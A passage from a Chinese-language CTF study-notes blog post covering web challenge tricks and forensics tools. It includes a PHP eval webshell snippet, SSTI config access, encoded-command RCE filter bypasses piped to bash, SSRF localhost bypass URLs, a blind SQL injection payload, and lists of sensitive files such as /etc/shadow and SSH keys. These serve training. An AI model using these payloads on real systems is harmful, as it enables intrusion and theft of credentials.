<h2 id="弱比较-x3D-x3D"><a href="#弱比较-x3D-x3D" class="headerlink" title="弱比较 &#x3D;&#x3D;"></a>弱比较 &#x3D;&#x3D;</h2><blockquote>
<p>使用=&#x3D;比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true=&#x3D;0或true=&#x3D;false或true&#x3D;&#x3D;null）</p>
</blockquote>
<h1 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>查看config：</p>
 可以获取当前设置，如果题目是这样的：

<blockquote>
<p>app.config [‘FLAG’] &#x3D; os.environ.pop（’FLAG’）</p>
</blockquote>
<p>可以直接访问  或者  得到 flag。</p>
<p>同样可以找到 config。</p>
<pre><code class="python">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;
</code></pre>
<h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501">https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501</a></p>
<p>我们平常的认知都是去写入一句话木马到一个php文件或者是jsp文件，然后连接那个文件的目录，实际上，不需要写入文件，我们照样可以利用eval函数造成一句话的形成最后拿下网站webshell</p>
<pre><code>&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c = $_GET[&#39;c&#39;];
        eval($c);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;
</code></pre>
<p><strong>eval()函数在执行时其中有多个函数，则第一个必须执行正确，第一个以后也必须是函数，但是正确与否都可以执行。</strong></p>
<pre><code>eval(&#39;phpinfo();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//成功执行
eval(&#39;asdasdsa();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//执行失败
</code></pre>
<pre><code>http://localhost/12.php?c=@eval($_POST[cmd]);  不行
</code></pre>
<pre><code>http://localhost/12.php?c=echo 1;@eval($_POST[cmd]);  行
</code></pre>
<p>再第二种情况下，我们可以使用蚁剑连接</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="参考步骤"><a href="#参考步骤" class="headerlink" title="参考步骤"></a>参考步骤</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ul>
<li>查看通道二维码</li>
<li>查看内嵌文件 stegseek、zsteg 分离 binwalk</li>
</ul>
<h3 id="未知文件"><a href="#未知文件" class="headerlink" title="未知文件"></a>未知文件</h3><ul>
<li><p>winhex 看文件头修改后缀</p>
<ul>
<li><p>core：string |grep</p>
</li>
<li><p>pdf：文件分离等 foremost</p>
</li>
</ul>
</li>
</ul>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul>
<li><p>直接find</p>
</li>
<li><p>提取文件 foremost -t all -i </p>
</li>
<li><p>过滤本网络查看异常</p>
</li>
</ul>
<h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><ul>
<li><p>如果flag存在于流量中，那么把包传入winhex，直接搜索flag等关键字</p>
</li>
<li><p>http contains “shell”</p>
</li>
</ul>
<h2 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/121959797">心仪的公司_心仪的公司攻防_红烧兔纸的博客-CSDN博客</a></p>
<blockquote>
<p>ip.addr &#x3D; 192.168.1.0&#x2F;24过滤内网ip</p>
<p>192.168.1.111大量访问外网，猜测是192.168.1.108做反向代理攻击过滤192.168.1.108追踪tcp流得到filag</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MrTreebook/article/details/123442355">攻防世界 Misc 心仪的公司-CSDN博客</a></p>
<pre><code>strings webshell.pcapng | grep &quot;&#123;&quot;
</code></pre>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l8947943/article/details/122692365">xctf攻防世界 MISC高手进阶区 low_攻防世界low-CSDN博客</a></p>
<p>用画图工具打开bmp图片，其次将其另存为png格式。接着使用stegsolve打开图片</p>
<h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>假设，有一个名为 lxk.py 的源文件：</p>
<p>print(“Hello Python!”)<br>要编译为 *.pyc 文件，需要引入 Python 中的模块 py_compile，在交互模式下输入：</p>
<pre><code>&gt;&gt;&gt; import py_compile
&gt;&gt;&gt; py_compile.compile(&quot;lxk.py&quot;)
</code></pre>
<h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><p>命令行下：<strong>python -m py_compile test.p</strong></p>
<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>首先安装库 <code>uncompyle:  pip install uncompyle</code></p>
<p>命令行下：uncompyle6 test.pyc &gt; test1.py </p>
<h2 id="formost-分离文件"><a href="#formost-分离文件" class="headerlink" title="formost 分离文件"></a>formost 分离文件</h2><p>c:&gt; foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>]<br>    [-b <size>] [-c <file>] [-o <dir>] [-i &lt;file]</p>
<blockquote>
<p>-V  - 显示版权信息并退出<br>-t  - 指定文件类型.  (-t jpeg,pdf …)<br>-d  - 打开间接块检测 (针对UNIX文件系统)<br>-i  - 指定输入文件 (默认为标准输入)<br>-a  - 写入所有的文件头部, 不执行错误检测(损坏文件)<br>-w  - 向磁盘写入审计文件，不写入任何检测到的文件<br>-o  - 设置输出目录 (默认为.&#x2F;output)<br>-c  - 设置配置文件 (默认为foremost.conf)<br>-q  - 启用快速模式. 在512字节边界执行搜索.<br>-Q  - 启用安静模式. 禁用输出消息.<br>-v  - 详细模式. 向屏幕上记录所有消息。</p>
</blockquote>
<p>foremost -i 分离隐藏文件</p>
<p>foremost -t 需要恢复文件类型后缀(如jpg) -i 扫描的分区 -o 指定存放文件的目录</p>
<p>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</p>
<blockquote>
<p>这个例子中，命令 <code>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</code> 将尝试从名为 <code>f9809647382a42e5bfb64d7d447b4099.pcap</code> 的 PCAP 文件中找回所有可能的文件类型。这些文件将会被提取并保存到指定的输出目录中。</p>
</blockquote>
<p>zsteg:</p>
<p>zsteg stego100.png</p>
<h2 id="binwalk-检索隐写"><a href="#binwalk-检索隐写" class="headerlink" title="binwalk 检索隐写"></a>binwalk 检索隐写</h2><p>binwalk xxx</p>
<h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头:"></a>常见文件头:</h3><pre><code>JPEG (jpg)，文件头：FF D8 FF
PNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0a
GIF (gif)，文件头：47 49 46 38
Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00python反编译文件pyc的头：03 F3 0D 0A  
（实验吧，py的交易会用到）pyd的文件头：4D 5A 90 00
ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件
rar文件: 52 61 72 217z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）
MS Word/Excel (xls.or.doc)，文件头：D0CF11E0
CAD (dwg)，文件头：41433130
Adobe Photoshop (psd)，文件头：38425053
Rich Text Format (rtf)，文件头：7B5C727466
XML (xml)，文件头：3C3F786D6C
HTML (html)，文件头：68746D6C3E
Email [thorough only] (eml)，文件头：44656C69766572792D646174653A
Outlook Express (dbx)，文件头：CFAD12FEC5FD746F
Outlook (pst)，文件头：2142444E
MS Access (mdb)，文件头：5374616E64617264204A
WordPerfect (wpd)，文件头：FF575043
Postscript (eps.or.ps)，文件头：252150532D41646F6265
Adobe Acrobat (pdf)，文件头：255044462D312E
Quicken (qdf)，文件头：AC9EBD8F
Windows Password (pwl)，文件头：E3828596
RAR Archive (rar)，文件头：52617221
Wave (wav)，文件头：57415645
AVI (avi)，文件头：41564920
Real Audio (ram)，文件头：2E7261FD
Real Media (rm)，文件头：2E524D46
MPEG (mpg)，文件头：000001BA
MPEG (mpg)，文件头：000001B3
Quicktime (mov)，文件头：6D6F6F76
Windows Media (asf)，文件头：3026B2758E66CF11
MIDI (mid)，文件头：4D546864
</code></pre>
<h2 id="Core文件简介"><a href="#Core文件简介" class="headerlink" title="Core文件简介"></a>Core文件简介</h2><p>Core文件其实就是内存的映像，当程序崩溃时，存储内存的相应信息，主用用于对程序进行调试。当程序崩溃时便会产生core文件，其实准确的应该说是core dump 文件,默认生成位置与可执行程序位于同一目录下，文件名为core.<em><strong>,其中</strong></em>是某一数字。</p>
<p>我们可以使用strings命令查看字符串内容<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>打印文件中可打印的字符</p>
<h2 id="分解合并图片"><a href="#分解合并图片" class="headerlink" title="分解合并图片"></a>分解合并图片</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1910472">【愚公系列】2021年11月 攻防世界-进阶题-MISC-019(glance-50)-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p>kali 的 convert 命令可以分解图片：</p>
<p>convert glance.gif flag.png</p>
<p>montage合并图片</p>
<pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png
</code></pre>
<h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote>
<ol>
<li>把当前目录下的所有.png格式的图片拼起来</li>
</ol>
<p>montage.exe *.png -geometry +0+0 -background #00000000 big.png</p>
<ol start="2">
<li>把当前目录和所有子目录下的.png格式的图片拼起来</li>
</ol>
<p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -background #00000000 big.png</p>
<p>拼图时会自动调整行列上的图片数，如果需要指定，加上参数-tile，例:</p>
<p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -tile 2x4 -background #00000000 big.png</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zaffix/article/details/7058587">https://blog.csdn.net/zaffix/article/details/7058587</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/89490494">攻防世界-Misc-glance-50(convert分离gif、montage图片拼接)-mma-ctf-2nd-2016-CSDN博客</a></p>
<blockquote>
<p>convert glance.gif flag.png</p>
<p>montage flag*.png -tile x1 -geometry +0+0 flag.png</p>
<p>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p>
<p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p>
</blockquote>
<h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><blockquote>
<p>–image 指向拼图的路径</p>
<p>–size 拼图块的像素尺寸</p>
<p>–generations 遗传算法的代的数量</p>
<p>–population 个体数量</p>
<p>–verbose 每一代训练结束后展示最佳结果</p>
<p>–save 将拼图还原为图像</p>
</blockquote>
<pre><code>gaps --image=test.png --generation=30 --population=300 --size=120
</code></pre>
<p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p>
<blockquote>
<h1 id="Creating-puzzles-from-images"><a href="#Creating-puzzles-from-images" class="headerlink" title="Creating puzzles from images"></a>Creating puzzles from images</h1><p>To create puzzle from image use <code>gaps create</code></p>
<pre><code>gaps create images/pillars.jpg puzzle.jpg --size=64
</code></pre>
<p>will create puzzle with 240 pieces from <code>images/pillars.jpg</code> where each piece is 64x64 pixels.</p>
<p>Run <code>gaps create --help</code> for detailed help.</p>
<p>注：根据给定的拼图大小，创建的拼图图像尺寸可能小于原始图像。从原始图像中裁剪出最大可能的矩形。</p>
</blockquote>
<blockquote>
<h1 id="Solving-puzzles"><a href="#Solving-puzzles" class="headerlink" title="Solving puzzles"></a>Solving puzzles</h1><p>In order to solve puzzles, use <code>gaps run</code>:</p>
<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600
</code></pre>
<p>This will start genetic algorithm with initial population of 600 and 20 generations.</p>
<p>Following options are provided:</p>
<table>
<thead>
<tr>
<th>Option</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>--size</code></td>
<td>拼图大小（像素）</td>
</tr>
<tr>
<td><code>--generations</code></td>
<td>遗传算法的代数</td>
</tr>
<tr>
<td><code>--population</code></td>
<td>Number of individuals in population</td>
</tr>
<tr>
<td><code>--debug</code></td>
<td>Show the best solution after each generation</td>
</tr>
</tbody></table>
<p>Run <code>gaps run --help</code> for detailed help.</p>
</blockquote>
<blockquote>
<h2 id="Size-detection"><a href="#Size-detection" class="headerlink" title="Size detection"></a>Size detection</h2><p>If you don’t explicitly provide <code>--size</code> argument to <code>gaps run</code>, piece size will be detected automatically.</p>
<p>However, you can always provide <code>gaps run</code> with <code>--size</code> argument explicitly:</p>
<pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600 --size=48
</code></pre>
</blockquote>
<h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><p>有时候不同压缩工具解压的结果有差异，需要都试试</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><p>php:&#x2F;&#x2F;input伪协议以POST传参</p>
<p>data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</p>
<p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
<pre><code>php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php
</code></pre>
<h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv:"></a>iconv:</h2><pre><code>UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
</code></pre>
<p><strong>windows常见的敏感文件路径:</strong></p>
<pre><code class="cobol">C:\boot.ini //查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
</code></pre>
<p><strong>Linux常见的敏感文件路径:</strong></p>
<pre><code>/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/id_ras.keystore
/root/.ssh/known_hosts //记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow
/etc/my.cnf //mysql配置文件
/etc/httpd/conf/httpd.conf //apache配置文件
/root/.bash_history //用户历史命令记录文件
/root/.mysql_history //mysql历史命令记录文件
/proc/mounts //记录系统挂载设备
/porc/config.gz //内核配置文件
/var/lib/mlocate/mlocate.db //全文件路径
/porc/self/cmdline //当前进程的cmdline参数

- /etc/passwd
- /proc/self/cmdline，用于获取当前启动进程的完整命令。
- /proc/self/maps获取堆栈分布
- /proc/self/mem得到进程的内存内容
</code></pre>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><pre><code>cat fl*  用匹配任意 
cat fla 用*匹配任意
ca\t fla\g.php        反斜线绕过
cat fl&#39;&#39;ag.php        两个单引号绕过
echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      
//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数

echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       
//hex编码绕过(引号可以去掉)

echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     
//sh的效果和bash一样

cat fl[a]g.php       用[]匹配

a=fl;b=ag;cat $a$b          变量替换
cp fla&#123;g.php,G&#125;    把flag.php复制为flaG
ca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 
</code></pre>
<h1 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h1><p>常见的网站源码备份文件后缀:</p>
<p>tar.gz，zip，rar，tar</p>
<p>常见的网站源码备份文件名：</p>
<p>web，website，backup，back，www，wwwroot，temp</p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>127.0.0.1被禁止访问，则可以尝试各种变形</p>
<pre><code>?url=http://@127.0.0.1:8000@/api/internal/secret
?url=http://2130706433:8000/api/internal/secret
?url=http://0x7f.0x0.0x0.0x1:8000/api/internal/secret
?url=http://[::127.0.0.1]:8000/api/internal/secret
?url=http://127。0。0。1:8000/api/internal/secret
?url=http://127.1:8000/api/internal/secret
?url=http://0.0.0.0:8000/api/internal/secret
?url=http://127.127.127.127:8000/api/internal/secret
</code></pre>
<p>127.0.0.1&#x3D;0.0.0.0&#x3D;127.127.127.127</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="cyberchef"><a href="#cyberchef" class="headerlink" title="cyberchef:"></a>cyberchef:</h2><p>affine:仿射密码</p>
<p>bacon：培根密码</p>
<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>查看路径： </p>
<pre><code>select @@secure_file_priv;
</code></pre>
<pre><code>uname=test&#39; or if(ascii(substr((select f1144g from f14141g limit 0,1),1,1))=45,sleep(3),1)#&amp;pword=1234
</code></pre>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/11/07/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="原型链污染"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 原型链污染</span></a><a class="button is-default" href="/2023/10/24/Windows-Privilege-Escalation/" title="Windows_Privilege_Escalation"><span class="has-text-weight-semibold">Next: Windows_Privilege_Escalation</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>